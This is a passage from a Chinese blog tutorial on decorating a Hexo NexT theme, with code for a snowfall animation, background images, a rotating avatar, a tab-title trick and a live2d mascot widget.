language_">this</span>.<span class="hljs-property">y</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * canvasHeight);  <span class="hljs-comment">/* y坐标 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * flakeSize + <span class="hljs-number">2</span>;          <span class="hljs-comment">/* 形状 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxSize</span> = flakeSize;                           <span class="hljs-comment">/* 最大形状 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1</span> + fallSpeed;         <span class="hljs-comment">/* 坠落速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span> = fallSpeed;                         <span class="hljs-comment">/* 坠落速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span>;                             <span class="hljs-comment">/* Y方向速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = <span class="hljs-number">0</span>;                                      <span class="hljs-comment">/* X方向速度 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stepSize</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() / <span class="hljs-number">30</span>;                 <span class="hljs-comment">/* 步长 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">step</span> = <span class="hljs-number">0</span>                                       <span class="hljs-comment">/* 步数 */</span><br>&#125;<br>flakeMove.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">update</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> x = <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>,<br>        y = <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>;<br>    <span class="hljs-comment">/* 左右摆动(余弦) */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> *= <span class="hljs-number">0.98</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> &lt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span><br>    &#125;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> += <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">cos</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">step</span> += <span class="hljs-number">.05</span>) * <span class="hljs-variable language_">this</span>.<span class="hljs-property">stepSize</span>;<br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> += <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span>;<br>    <span class="hljs-comment">/* 飞出边界的处理 */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> &gt;= canvas.<span class="hljs-property">width</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> &lt;= <span class="hljs-number">0</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> &gt;= canvas.<span class="hljs-property">height</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> &lt;= <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">reset</span>(canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>)<br>    &#125;<br>&#125;;<br><span class="hljs-comment">/* 飞出边界-放置最顶端继续坠落 */</span><br>flakeMove.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">reset</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">width, height</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * width);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxSize</span> + <span class="hljs-number">2</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span> = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>() * <span class="hljs-number">1</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velY</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">speed</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">velX</span> = <span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-comment">// 渲染雪花-随机形状（此处可修改雪花颜色！！！）</span><br>flakeMove.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">render</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">ctx</span>) &#123;<br>    <span class="hljs-keyword">var</span> snowFlake = ctx.<span class="hljs-title function_">createRadialGradient</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>);<br>    snowFlake.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;rgba(255, 255, 255, 0.9)&quot;</span>);  <span class="hljs-comment">/* 此处是雪花颜色，默认是白色 */</span><br>    snowFlake.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">.5</span>, <span class="hljs-string">&quot;rgba(255, 255, 255, 0.5)&quot;</span>); <span class="hljs-comment">/* 若要改为其他颜色，请自行查 */</span><br>    snowFlake.<span class="hljs-title function_">addColorStop</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rgba(255, 255, 255, 0)&quot;</span>);    <span class="hljs-comment">/* 找16进制的RGB 颜色代码。 */</span><br>    ctx.<span class="hljs-title function_">save</span>();<br>    ctx.<span class="hljs-property">fillStyle</span> = snowFlake;<br>    ctx.<span class="hljs-title function_">beginPath</span>();<br>    ctx.<span class="hljs-title function_">arc</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>, <span class="hljs-number">0</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-property">PI</span> * <span class="hljs-number">2</span>);<br>    ctx.<span class="hljs-title function_">fill</span>();<br>    ctx.<span class="hljs-title function_">restore</span>();<br>&#125;;<br><span class="hljs-comment">/* 创建雪花-定义形状 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">createFlakes</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> maxFlake = <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxFlake</span>,<br>        flakes = <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakes</span> = [],<br>        canvas = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; maxFlake; i++) &#123;<br>        flakes.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">flakeMove</span>(canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakeSize</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">fallSpeed</span>))<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* 画雪 */</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">drawSnow</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> maxFlake = <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxFlake</span>,<br>        flakes = <span class="hljs-variable language_">this</span>.<span class="hljs-property">flakes</span>;<br>    ctx = <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>, canvas = <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>, that = <span class="hljs-variable language_">this</span>;<br>    <span class="hljs-comment">/* 清空雪花 */</span><br>    ctx.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, canvas.<span class="hljs-property">width</span>, canvas.<span class="hljs-property">height</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> e = <span class="hljs-number">0</span>; e &lt; maxFlake; e++) &#123;<br>        flakes[e].<span class="hljs-title function_">update</span>();<br>        flakes[e].<span class="hljs-title function_">render</span>(ctx);<br>    &#125;<br>    <span class="hljs-comment">/*  一帧一帧的画 */</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">loop</span> = <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        drawSnow.<span class="hljs-title function_">apply</span>(that);<br>    &#125;);<br>&#125;<br><span class="hljs-comment">/* 调用及控制方法 */</span><br><span class="hljs-keyword">var</span> snow = <span class="hljs-keyword">new</span> <span class="hljs-title function_">snowFall</span>(&#123;<span class="hljs-attr">maxFlake</span>:<span class="hljs-number">60</span>&#125;);<br>snow.<span class="hljs-title function_">start</span>();<br></code></pre></td></tr></table></figure><p>然后在_layout.swig的末尾添加代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 雪花特效 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;\js\snow.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="三、更改背景图片（普通设置-自动更换壁纸）"><a href="#三、更改背景图片（普通设置-自动更换壁纸）" class="headerlink" title="三、更改背景图片（普通设置+自动更换壁纸）"></a>三、更改背景图片（普通设置+自动更换壁纸）</h1><p>如果只是普通的白色背景看着挺单调的，所以也可以选择更改下背景的图片。</p><p>在<strong>\themes\next\source\css_custom\custom.styl</strong>添加以下代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span>&#123;<br>    <span class="hljs-attribute">background</span>:<span class="hljs-built_in">url</span>(<span class="hljs-string">/images/bg.jpg</span>);<br>    <span class="hljs-attribute">background-size</span>:cover;<br>    <span class="hljs-attribute">background-repeat</span>:no-repeat;<br>    <span class="hljs-attribute">background-attachment</span>:fixed;<br>    <span class="hljs-attribute">background-position</span>:center;<br>&#125;<br></code></pre></td></tr></table></figure><p>图片路径<strong>\themes\next\source\images\bg.jpg</strong></p><p>也可以选择<strong>自动更换背景</strong>。</p><p>在<strong>\themes\next\source\css_custom\custom.styl</strong>添加以下代码。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs css">// Custom styles.<br>// 添加背景图片<br><span class="hljs-selector-tag">body</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">https://source.unsplash.com/random/1600x900?wallpapers</span>);<br>  <span class="hljs-attribute">background-size</span>: cover;<br>  <span class="hljs-attribute">background-repeat</span>: no-repeat;<br>  <span class="hljs-attribute">background-attachment</span>: fixed;<br>  <span class="hljs-attribute">background-position</span>: <span class="hljs-number">50%</span> <span class="hljs-number">50%</span>;<br>&#125;<br><br>// 修改主体透明度<br><span class="hljs-selector-class">.main-inner</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;<br>  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.8</span>;<br>&#125;<br><br>// 修改菜单栏透明度<br><span class="hljs-selector-class">.header-inner</span> &#123;<br>  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>图片的来源是：<a href="https://source.unsplash.com/%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E8%87%AA%E5%B7%B1%E7%9A%84%E6%83%B3%E6%B3%95%E8%AE%BE%E5%AE%9A%E6%9B%B4%E6%8D%A2%E6%AC%A1%E6%95%B0%E5%92%8C%E8%83%8C%E6%99%AF%E9%A3%8E%E6%A0%BC%E3%80%82">https://source.unsplash.com/，可以根据自己的想法设定更换次数和背景风格。</a></p><h1 id="四、旋转头像"><a href="#四、旋转头像" class="headerlink" title="四、旋转头像"></a>四、旋转头像</h1><p><img src="https://i.loli.net/2019/08/17/GJLNzyProEsvB5g.gif" alt="1111.gif"></p><p>修改**&#x2F;themes&#x2F;next&#x2F;source&#x2F;css&#x2F;_common&#x2F;components&#x2F;sidebar&#x2F;sidebar-author.styl**文件为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.site-author-image</span> &#123;<br>  <span class="hljs-attribute">display</span>: block;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  <span class="hljs-attribute">padding</span>: $site-author-image-padding;<br>  <span class="hljs-attribute">max-width</span>: $site-author-image-width;<br>  <span class="hljs-attribute">height</span>: $site-author-image-height;<br>  <span class="hljs-attribute">border</span>: $site-author-image-border-width solid $site-author-image-border-color;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">60%</span>;<br>  <span class="hljs-attribute">transition</span>: <span class="hljs-number">2.5s</span> all;  <br>&#125;<br><br><span class="hljs-selector-class">.site-author-image</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">rotate</span>(<span class="hljs-number">360deg</span>);<br>&#125;<br><br><br><span class="hljs-selector-class">.site-author-name</span> &#123;<br>  <span class="hljs-attribute">margin</span>: $site-author-name-margin;<br>  <span class="hljs-attribute">text-align</span>: $site-author-name-align;<br>  <span class="hljs-attribute">color</span>: $site-author-name-color;<br>  <span class="hljs-attribute">font-weight</span>: $site-author-name-weight;<br>&#125;<br><br><span class="hljs-selector-class">.site-description</span> &#123;<br>  <span class="hljs-attribute">margin-top</span>: $site-description-margin-top;<br>  <span class="hljs-attribute">text-align</span>: $site-description-align;<br>  <span class="hljs-attribute">font-size</span>: $site-description-font-size;<br>  <span class="hljs-attribute">color</span>: $site-description-color;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="五、Funny标题栏w"><a href="#五、Funny标题栏w" class="headerlink" title="五、Funny标题栏w"></a>五、Funny标题栏w</h1><p>很有趣的一个美化，当你浏览其他网页时，标题栏的文字会变更，当你回到页面，又会再次变更（还记得之前逛一个博客，只要离开页面就会显示【高清美女照片】，吓得我还以为开了个什么网站）。</p><p><img src="https://i.loli.net/2019/08/17/mTbwHJlXfEak6KU.gif" alt="2222.gif"></p><p>在<strong>\themes\next\source\js</strong>文件下创建一个<strong>FunnyTitle.js</strong>文件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;!--浏览器搞笑标题--&gt;<br> <span class="hljs-keyword">var</span> <span class="hljs-title class_">OriginTitle</span> = <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span>;<br> <span class="hljs-keyword">var</span> titleTime;<br> <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;visibilitychange&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">hidden</span>) &#123;<br>         $(<span class="hljs-string">&#x27;[rel=&quot;icon&quot;]&#x27;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&quot;/img/trhx2.png&quot;</span>);<br>         <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;警告！警告！&#x27;</span>;<br>         <span class="hljs-built_in">clearTimeout</span>(titleTime);<br>     &#125;<br>     <span class="hljs-keyword">else</span> &#123;<br>         $(<span class="hljs-string">&#x27;[rel=&quot;icon&quot;]&#x27;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&#x27;href&#x27;</span>, <span class="hljs-string">&quot;/img/trhx2.png&quot;</span>);<br>         <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-string">&#x27;ヾ(◍°∇°◍)欢迎回来|&#x27;</span> + <span class="hljs-title class_">OriginTitle</span>;<br>         titleTime = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>             <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = <span class="hljs-title class_">OriginTitle</span>;<br>         &#125;, <span class="hljs-number">2000</span>);<br>     &#125;<br> &#125;);<br></code></pre></td></tr></table></figure><p>然后在**_layout.swig**的末尾添加代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--浏览器搞笑标题--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/FunnyTitle.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="六、添加live2d看板娘"><a href="#六、添加live2d看板娘" class="headerlink" title="六、添加live2d看板娘"></a>六、添加live2d看板娘</h1><p>live2d是这几年比较火热的一门技术，是应用于游戏中的一种绘图渲染，近几年广泛应用于手游中（作为看板）。很意外的，它也很适用于博客中。</p><p>虽然本身的功能不大，但是作为美化来说还是十分可爱的。</p><p>虽然有朋友在研究这项技术，但由于我本身的画图技术不强，对于live2d的制作就不讲了，只说如何放上一个live2d。</p><h2 id="1-简易版"><a href="#1-简易版" class="headerlink" title="1.简易版"></a>1.简易版</h2><p>如果对于看板娘的要求不是特别高，只是需要放在那里卖个萌就行，建议用简易版的就ok。</p><p><strong>安装插件：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install --save hexo-helper-live2d<br></code></pre></td></tr></table></figure><p><strong>安装模型</strong>（模型的样式可以参考<a href="https://huaji8.top/post/live2d-plugin-2.0/">这里</a>，把packagename的名字换成自己喜欢的模型名即可）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install packagename<br></code></pre></td></tr></table></figure><p>当然你也可以用自己制作的模型和网上下载的，一些详细的设置可以参考<a href="https://github.com/EYHN/hexo-helper-live2d/blob/master/README.zh-CN.md">作者文档</a>。</p><h2 id="2-中级版"><a href="#2-中级版" class="headerlink" title="2.中级版"></a>2.中级版</h2><p>比起简易版添加了对话框功能。</p><p>长这样（↓）</p><p><img src="https://i.loli.net/2019/08/08/4hlWGRbJx1yZDrL.jpg" alt="1.jpg"></p><p>首先下载大佬的<a href="https://github.com/galnetwen/Live2D">github代码</a>，把下载下来的文件更名为live2d，然后放到themes\next\source文件里。</p><p>打开\themes\next\layout下的_layout.swig，在<strong>body</strong>标签内添加：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/live2d/css/live2d.css&quot;</span> /&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;landlord&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;message&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;opacity:0&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;live2d&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;280&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;250&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;live2d&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;hide-button&quot;</span>&gt;</span>隐藏<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> message_Path = <span class="hljs-string">&#x27;/live2d/&#x27;</span></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> home_Path = <span class="hljs-string">&#x27;https://soyawww.github.io/&#x27;</span>  <span class="hljs-comment">//此处修改为你的域名</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/live2d/js/live2d.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/live2d/js/message.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title function_">loadlive2d</span>(<span class="hljs-string">&quot;live2d&quot;</span>, <span class="hljs-string">&quot;/live2d/model/tia/model.json&quot;</span>);  <span class="hljs-comment">//此处为你是用的模型文件，可以修改</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>如要修改模型，修改上面代码的loadlive2d路径即可。</p><p>如要修改点击时看板娘或者鼠标放在某个元素上的对话，打开live2d文件中的message.json进行修改。</p><h2 id="3-高级版"><a href="#3-高级版" class="headerlink" title="3.高级版"></a>3.高级版</h2><p><img src="https://s2.ax1x.com/2019/08/17/mKSIy9.gif" alt="mKSIy9.gif"></p><p>拥有换装、换人、飞机大战小游戏等功能的看板娘（也就是我现在正在用的。）</p><p>首先下载大佬的<a href="https://github.com/stevenjoezhang/live2d-widget">github文件</a>，修改好名字放置于<strong>\themes\next\source</strong>下（当然你也可以选择直接fork仓库，如果你不想下载文件的话就直接跳过这一段吧）。</p><p>打开_layout.swig文件，先在<strong>head</strong>标签下添加依赖，否则无法正常显示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>然后再在<strong>footer</strong>标签下添加：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://soyawww.github.io/live2d/autoload.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>打开live2d文件下的<strong>autoloads.js</strong>文件，修改绝对路径：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> live2d_path = <span class="hljs-string">&quot;/live2d/&quot;</span>;<br></code></pre></td></tr></table></figure><p>其他的就按照自己的需求修改。</p><p>例如waifu.css修改看板的大小和位置，waifu-tips.json修改对话。</p><p><img src="https://i.loli.net/2019/08/08/EHhTntz1RZeaNSM.jpg" alt="screenshot.1.jpg"></p><p>总之，更多的内容就自己摸索吧！</p><p><strong>~关于fork仓库和api</strong></p><p>其实不用下下来文件也可以直接用，用法是添加在添加依赖后直接添加一行代码在<strong>footer</strong>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个是直接用的大佬的仓库，你可以选择把仓库fork下来，然后自行修改（如下）。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://cdn.jsdelivr.net/gh/username/live2d-widget/autoload.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>无论是用fork仓库的方法还是下载文件，都是无法改变模型的，如果想要<strong>改变模型</strong>，就需要自建api（详情参考<a href="https://github.com/fghrsh/live2d_api">这里</a>）。</p><h1 id="七、添加音乐插件aplayer"><a 